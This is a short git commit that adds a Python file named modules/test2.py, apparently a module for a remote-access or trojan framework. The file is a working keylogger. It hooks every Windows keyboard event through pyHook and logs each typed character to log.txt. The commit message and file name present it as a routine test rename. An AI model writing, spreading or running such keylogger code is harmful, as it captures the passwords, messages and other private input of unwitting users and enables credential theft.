02ee4fa7f97a992af933ee421be088adbe2fa60b
experiment2016 <sarpiericam@libero.it>
2016-05-30 19:01:20 +0200

    Update and rename testx.py to test2.py

---
+++ modules/test2.py
@@ -0,0 +1,15 @@
+import pyHook, pythoncom, sys, logging
+
+def run(**args):
+  try:
+     file_log='log.txt'
+     def OnKeyboardEvent (event):
+         logging.basicConfig(filename=file_log, level=logging.DEBUG, format ='%(message)s')
+         logging.log(10, chr(event.Ascii))
+         return True
+     hooks_manager = pyHook.HookManager()
+     hooks_manager.KeyDown = OnKeyboardEvent
+     hooks_manager.HookKeyboard()
+     pythoncom.PumpMessages()
+  except Exception, e:
+      return str(e)
